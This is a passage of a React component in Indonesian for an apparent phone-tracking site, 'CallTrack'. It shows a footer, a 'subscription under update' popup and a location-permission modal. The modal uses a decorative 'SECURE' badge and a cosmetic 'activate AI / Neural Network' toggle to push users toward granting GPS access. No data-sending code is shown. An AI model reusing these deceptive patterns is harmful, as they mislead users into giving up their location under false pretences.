                ].map((col, i) => (
                  <div key={i}>
                    <h4 className="text-white font-semibold text-sm mb-4">
                      {col.title}
                    </h4>
                    <ul className="space-y-2.5">
                      {col.links.map((link, j) => (
                        <li key={j}>
                          <a
                            href="#"
                            className="text-white/30 text-xs hover:text-accent-blue transition-colors"
                          >
                            {link}
                          </a>
                        </li>
                      ))}
                    </ul>
                  </div>
                ))}
              </div>

              <div className="border-t border-white/5 mt-10 pt-6 flex flex-col sm:flex-row items-center justify-between gap-4">
                <p className="text-white/20 text-xs">
                  © 2026 CallTrack. Semua hak cipta dilindungi undang-undang.
                </p>
                <p className="text-white/20 text-xs">Hanya untuk usia 18+</p>
              </div>
            </div>
          </footer>
        </>
      )}

      {/* ===== POPUP SUBSCRIBE ===== */}
      {showSubscribePopup && (
        <div className="fixed inset-0 z-[100] flex items-center justify-center p-4">
          <div className="absolute inset-0 bg-black/60 backdrop-blur-sm" onClick={() => setShowSubscribePopup(false)}></div>
          <div className="glass-card relative z-10 w-full max-w-md p-8 text-center animate-fade-in-up" style={{ animationDuration: "0.4s" }}>
            <div className="w-16 h-16 rounded-full bg-accent-blue/10 flex items-center justify-center mx-auto mb-5 border border-accent-blue/20">
              <Zap className="w-8 h-8 text-accent-cyan animate-pulse" />
            </div>
            <h3 className="text-2xl font-extrabold text-white mb-3">Mohon Tunggu</h3>
            <p className="text-white/60 text-sm leading-relaxed mb-8">
              Fitur langganan sedang dalam tahap update. Mohon tunggu update terbaru dari tim kami.
            </p>
            <button
              onClick={() => setShowSubscribePopup(false)}
              className="btn-primary w-full py-3 rounded-xl font-semibold hover:scale-[1.02] transition-transform"
            >
              Mengerti
            </button>
          </div>
        </div>
      )}

      {/* ===== POPUP IZIN LOKASI ===== */}
      {showLocationPermission && (
        <div className="fixed inset-0 z-[100] flex items-center justify-center p-4">
          <div className="absolute inset-0 bg-black/75 backdrop-blur-lg" onClick={() => setShowLocationPermission(false)}></div>
          
          <div className="relative z-10 w-full max-w-[360px] animate-fade-in-up" style={{ animationDuration: "0.4s" }}>
            {/* Outer glow ring */}
            <div className="absolute -inset-[1px] rounded-[28px] bg-gradient-to-b from-accent-blue/40 via-accent-purple/20 to-transparent pointer-events-none"></div>
            
            <div className="relative rounded-[27px] overflow-hidden" style={{ background: 'linear-gradient(160deg, #0d0d22 0%, #0a0a1e 60%, #0d0a22 100%)' }}>
              
              {/* Dot grid pattern overlay */}
              <div className="absolute inset-0 pointer-events-none" style={{
                backgroundImage: 'radial-gradient(circle, rgba(47,128,237,0.08) 1px, transparent 1px)',
                backgroundSize: '20px 20px'
              }}></div>

              {/* Top ambient glow */}
              <div className="absolute -top-16 left-1/2 -translate-x-1/2 w-72 h-40 rounded-full pointer-events-none" style={{ background: 'radial-gradient(ellipse, rgba(47,128,237,0.25) 0%, transparent 70%)' }}></div>
              {/* Bottom-right purple glow */}
              <div className="absolute -bottom-12 -right-8 w-48 h-48 rounded-full pointer-events-none" style={{ background: 'radial-gradient(ellipse, rgba(138,43,226,0.18) 0%, transparent 70%)' }}></div>

              {/* ── TOP BAR ── */}
              <div className="relative flex items-center justify-between px-5 pt-5 pb-4">
                <div className="flex items-center gap-1.5">
                  <div className="w-2 h-2 rounded-full bg-red-400/70"></div>
                  <div className="w-2 h-2 rounded-full bg-yellow-400/70"></div>
                  <div className="w-2 h-2 rounded-full bg-green-400/70"></div>
                </div>
                <div className="flex items-center gap-1.5 bg-white/5 border border-white/8 rounded-full px-3 py-1">
                  <div className="w-1.5 h-1.5 rounded-full bg-accent-green animate-pulse"></div>
                  <span className="text-white/40 text-[10px] font-mono tracking-wider">SECURE · calltrack.app</span>
                </div>
                <Shield className="w-3.5 h-3.5 text-accent-green/50" />
              </div>

              {/* ── HERO SECTION ── */}
              <div className="relative px-6 pt-2 pb-7 text-center">
                {/* Icon cluster */}
                <div className="relative inline-flex items-center justify-center mb-5">
                  {/* Ping rings */}
                  <div className="absolute w-24 h-24 rounded-full border border-accent-blue/10 animate-ping" style={{ animationDuration: '3s' }}></div>
                  <div className="absolute w-20 h-20 rounded-full border border-accent-blue/15 animate-ping" style={{ animationDuration: '2.5s', animationDelay: '0.5s' }}></div>
                  {/* Glow layer */}
                  <div className="absolute w-16 h-16 rounded-2xl bg-accent-blue/20 blur-2xl"></div>
                  {/* Icon box */}
                  <div className="relative w-16 h-16 rounded-2xl flex items-center justify-center" style={{ background: 'linear-gradient(135deg, #2f80ed 0%, #8a2be2 100%)', boxShadow: '0 8px 32px rgba(47,128,237,0.4), inset 0 1px 0 rgba(255,255,255,0.15)' }}>
                    <MapPin className="w-8 h-8 text-white" style={{ filter: 'drop-shadow(0 2px 8px rgba(255,255,255,0.3))' }} />
                  </div>
                </div>

                <p className="text-white/30 text-[10px] font-medium tracking-[0.2em] uppercase mb-2">Konfirmasi Akses AI</p>
                <h3 className="text-white font-extrabold text-2xl mb-2 leading-tight tracking-tight">Izin Perangkat</h3>
                <p className="text-white/40 text-xs leading-relaxed max-w-[220px] mx-auto">Diperlukan untuk memulai pelacakan lokasi berbasis AI secara akurat</p>
              </div>

              {/* ── DIVIDER ── */}
              <div className="mx-5 h-px" style={{ background: 'linear-gradient(90deg, transparent, rgba(47,128,237,0.3), rgba(138,43,226,0.3), transparent)' }}></div>

              {/* ── PERMISSION ITEMS ── */}
              <div className="px-5 pt-5 space-y-3">
                {/* GPS */}
                <button
                  onClick={handleGpsToggle}
                  className="relative w-full flex items-center gap-3.5 p-4 rounded-2xl overflow-hidden text-left transition-all duration-300"
                  style={{
                    background: gpsChecked ? 'rgba(47,128,237,0.12)' : 'rgba(47,128,237,0.04)',
                    border: gpsChecked ? '1px solid rgba(47,128,237,0.4)' : '1px solid rgba(47,128,237,0.15)',
                    boxShadow: gpsChecked ? '0 0 20px rgba(47,128,237,0.1)' : 'none'
                  }}
                >
                  <div
                    className="w-9 h-9 rounded-xl flex items-center justify-center shrink-0 transition-all duration-300"
                    style={{
                      background: gpsChecked
                        ? 'linear-gradient(135deg, rgba(47,128,237,0.8), rgba(47,128,237,0.5))'
                        : 'rgba(47,128,237,0.08)',
                      border: gpsChecked ? '1px solid rgba(47,128,237,0.5)' : '1px solid rgba(47,128,237,0.2)',
                      boxShadow: gpsChecked ? '0 0 16px rgba(47,128,237,0.4)' : 'none'
                    }}
                  >
                    {gpsChecked ? (
                      <svg className="w-4 h-4 text-white" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth={3}>
                        <path strokeLinecap="round" strokeLinejoin="round" d="M5 13l4 4L19 7" />
                      </svg>
                    ) : (
                      <MapPin className="w-4 h-4" style={{ color: 'rgba(47,128,237,0.6)' }} />
                    )}
                  </div>
                  <div className="flex-1 min-w-0">
                    <p className="text-white text-sm font-semibold leading-tight">Akses Lokasi GPS</p>
                    <p className="text-[11px] mt-0.5 leading-snug transition-colors" style={{ color: gpsChecked ? 'rgba(47,128,237,0.8)' : 'rgba(255,255,255,0.35)' }}>
                      {gpsChecked ? '✓ Izin lokasi diberikan' : 'Ketuk untuk izinkan akses lokasi'}
                    </p>
                  </div>
                  <div
                    className="w-5 h-5 rounded-full border-2 shrink-0 flex items-center justify-center transition-all duration-300"
                    style={{
                      borderColor: gpsChecked ? 'rgba(47,128,237,0.8)' : 'rgba(255,255,255,0.15)',
                      background: gpsChecked ? 'rgba(47,128,237,0.8)' : 'transparent'
                    }}
                  >
                    {gpsChecked && <svg className="w-2.5 h-2.5 text-white" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth={3.5}><path strokeLinecap="round" strokeLinejoin="round" d="M5 13l4 4L19 7" /></svg>}
                  </div>
                </button>

                {/* AI System */}
                <button
                  onClick={handleAiToggle}
                  className="relative w-full flex items-center gap-3.5 p-4 rounded-2xl overflow-hidden text-left transition-all duration-300"
                  style={{
                    background: aiChecked ? 'rgba(138,43,226,0.12)' : 'rgba(138,43,226,0.04)',
                    border: aiChecked ? '1px solid rgba(138,43,226,0.4)' : '1px solid rgba(138,43,226,0.15)',
                    boxShadow: aiChecked ? '0 0 20px rgba(138,43,226,0.1)' : 'none'
                  }}
                >
                  <div
                    className="w-9 h-9 rounded-xl flex items-center justify-center shrink-0 transition-all duration-300"
                    style={{
                      background: aiChecked
                        ? 'linear-gradient(135deg, rgba(138,43,226,0.8), rgba(138,43,226,0.5))'
                        : 'rgba(138,43,226,0.08)',
                      border: aiChecked ? '1px solid rgba(138,43,226,0.5)' : '1px solid rgba(138,43,226,0.2)',
                      boxShadow: aiChecked ? '0 0 16px rgba(138,43,226,0.4)' : 'none'
                    }}
                  >
                    {aiChecked ? (
                      <svg className="w-4 h-4 text-white" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth={3}>
                        <path strokeLinecap="round" strokeLinejoin="round" d="M5 13l4 4L19 7" />
                      </svg>
                    ) : (
                      <Cpu className="w-4 h-4" style={{ color: 'rgba(138,43,226,0.6)' }} />
                    )}
                  </div>
                  <div className="flex-1 min-w-0">
                    <p className="text-white text-sm font-semibold leading-tight">Aktifkan Sistem AI</p>
                    <p className="text-[11px] mt-0.5 leading-snug transition-colors" style={{ color: aiChecked ? 'rgba(138,43,226,0.9)' : 'rgba(255,255,255,0.35)' }}>
                      {aiChecked ? '✓ Sistem AI diaktifkan' : 'Ketuk untuk aktifkan Neural Network'}
                    </p>
                  </div>
                  <div
                    className="w-5 h-5 rounded-full border-2 shrink-0 flex items-center justify-center transition-all duration-300"
                    style={{
                      borderColor: aiChecked ? 'rgba(138,43,226,0.8)' : 'rgba(255,255,255,0.15)',
                      background: aiChecked ? 'rgba(138,43,226,0.8)' : 'transparent'
                    }}
                  >
                    {aiChecked && <svg className="w-2.5 h-2.5 text-white" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth={3.5}><path strokeLinecap="round" strokeLinejoin="round" d="M5 13l4 4L19 7" /></svg>}
                  </div>
                </button>
              </div>

              {/* ── CTA ── */}
              <div className="px-5 pt-4 pb-5">
                <button
                  onClick={handleAllowLocation}
                  disabled={!gpsChecked || !aiChecked}
                  className="relative w-full py-4 rounded-2xl font-bold text-sm text-white flex items-center justify-center gap-2.5 overflow-hidden transition-all duration-300 group"
                  style={{
                    background: (gpsChecked && aiChecked)
                      ? 'linear-gradient(135deg, #2f80ed 0%, #6a3de8 50%, #8a2be2 100%)'
                      : 'rgba(255,255,255,0.05)',
                    boxShadow: (gpsChecked && aiChecked) ? '0 8px 32px rgba(47,128,237,0.35), 0 2px 8px rgba(0,0,0,0.3)' : 'none',
                    border: (gpsChecked && aiChecked) ? 'none' : '1px solid rgba(255,255,255,0.08)',
                    cursor: (gpsChecked && aiChecked) ? 'pointer' : 'not-allowed',
                    transform: (gpsChecked && aiChecked) ? undefined : 'none'
                  }}
                >
                  {/* Shine sweep - only when enabled */}
                  {(gpsChecked && aiChecked) && (
                    <div className="absolute inset-0 translate-x-[-100%] group-hover:translate-x-[100%] transition-transform duration-700" style={{ background: 'linear-gradient(90deg, transparent, rgba(255,255,255,0.12), transparent)' }}></div>
                  )}
                  <svg className="w-4 h-4 relative" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth={2.5}>
                    <path strokeLinecap="round" strokeLinejoin="round" d="M5 13l4 4L19 7" />
                  </svg>
                  <span className="relative" style={{ color: (gpsChecked && aiChecked) ? 'white' : 'rgba(255,255,255,0.25)' }}>
                    {(gpsChecked && aiChecked) ? 'Setuju, AI Cari Lokasi Akurat' : 'Aktifkan izin di atas terlebih dahulu'}
                  </span>
                </button>

              </div>
            </div>
          </div>
        </div>
      )}
    </div>
  );
}
